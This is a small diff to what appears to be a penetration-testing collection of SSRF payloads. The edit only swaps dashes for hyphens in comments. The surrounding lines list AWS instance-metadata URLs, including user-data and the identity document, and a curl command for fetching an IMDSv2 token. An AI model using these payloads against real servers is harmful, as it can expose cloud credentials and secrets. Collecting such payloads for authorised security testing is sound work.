@@ -1,5 +1,5 @@
 ## ============================================================
-## SSRF Payloads — Real-World VAPT Collection
+## SSRF Payloads - Real-World VAPT Collection
 ## ============================================================
 
 ## ---- AWS METADATA (IMDSv1) ----
@@ -13,7 +13,7 @@ http://169.254.169.254/latest/meta-data/ami-id
 http://169.254.169.254/latest/user-data
 http://169.254.169.254/latest/dynamic/instance-identity/document
 
-## ---- AWS IMDSv2 (requires token — test if accessible without) ----
+## ---- AWS IMDSv2 (requires token - test if accessible without) ----
 # Step 1: Get token
 # curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
 # Step 2: Use token
